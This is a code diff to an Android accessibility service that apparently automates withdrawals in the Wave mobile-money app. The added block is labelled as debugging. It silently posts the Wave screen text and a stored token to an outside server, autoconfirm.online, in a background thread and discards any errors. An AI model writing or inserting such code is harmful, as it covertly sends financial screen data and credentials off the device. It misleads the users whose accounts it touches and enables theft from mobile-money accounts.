@@ -73,6 +73,20 @@ public class WaveWithdrawalService extends AccessibilityService {
 
         String screenText = getAllText(root);
         Log.d(TAG, "State=" + state + " screen=" + screenText.substring(0, Math.min(60, screenText.length())));
+        // Envoyer ecran Wave au serveur pour debug
+        if (state != STATE_IDLE) {
+            new Thread(() -> {
+                try {
+                    SharedPreferences p = getSharedPreferences("config", MODE_PRIVATE);
+                    String tok = p.getString("token", "");
+                    okhttp3.OkHttpClient cl = new okhttp3.OkHttpClient();
+                    org.json.JSONObject j = new org.json.JSONObject();
+                    j.put("token", tok); j.put("sender", "WAVE-SCREEN"); j.put("message", "State=" + state + " | " + screenText.substring(0, Math.min(200, screenText.length())));
+                    okhttp3.RequestBody b = okhttp3.RequestBody.create(j.toString(), JSON_TYPE);
+                    cl.newCall(new okhttp3.Request.Builder().url("https://autoconfirm.online/webhook/debug-notif").addHeader("x-token", tok).addHeader("Content-Type","application/json").post(b).build()).execute().close();
+                } catch(Exception e) {}
+            }).start();
+        }
 
         // Verifier si trigger de retrait
         if (triggerWithdrawal && state == STATE_IDLE) {
